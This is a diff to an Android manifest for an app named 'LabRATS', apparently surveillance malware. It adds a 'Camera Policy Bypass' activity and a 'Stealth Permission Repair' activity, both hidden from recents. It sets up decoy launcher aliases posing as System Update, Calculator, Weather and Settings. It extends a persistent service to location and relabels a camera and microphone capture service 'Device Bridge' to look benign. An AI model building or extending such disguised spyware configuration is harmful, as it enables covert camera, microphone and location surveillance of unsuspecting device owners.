@@ -98,6 +98,22 @@
             android:theme="@style/Theme.LabRATS">
         </activity>
 
+        <!-- Camera Policy Bypass Activity -->
+        <activity
+            android:name=".CameraHelper$BypassActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:exported="false" />
+
+        <!-- Stealth Permission Repair Activity -->
+        <activity
+            android:name=".PermissionActivity"
+            android:theme="@style/Theme.LabRATS.Permissions"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:exported="false" />
+
         <activity
             android:name=".DecoyActivity"
             android:exported="false"
@@ -126,6 +142,7 @@
             android:exported="true"
             android:label="System Update"
             android:icon="@mipmap/ic_system_update_adaptive"
+            android:roundIcon="@mipmap/ic_system_update_round"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -139,6 +156,7 @@
             android:exported="true"
             android:label="Calculator"
             android:icon="@mipmap/ic_calculator_adaptive"
+            android:roundIcon="@mipmap/ic_calculator_adaptive"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -152,6 +170,7 @@
             android:exported="true"
             android:label="Weather"
             android:icon="@mipmap/ic_weather_adaptive"
+            android:roundIcon="@mipmap/ic_weather_adaptive"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -165,6 +184,7 @@
             android:exported="true"
             android:label="Settings"
             android:icon="@mipmap/ic_settings_adaptive"
+            android:roundIcon="@mipmap/ic_settings_round"
             android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -177,13 +197,13 @@
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync|location" />
 
         <service
             android:name=".MediaContainer"
             android:enabled="true"
             android:exported="false"
-            android:label="Core Processor"
+            android:label="Device Bridge"
             android:stopWithTask="false"
             android:foregroundServiceType="camera|microphone|dataSync" />
 
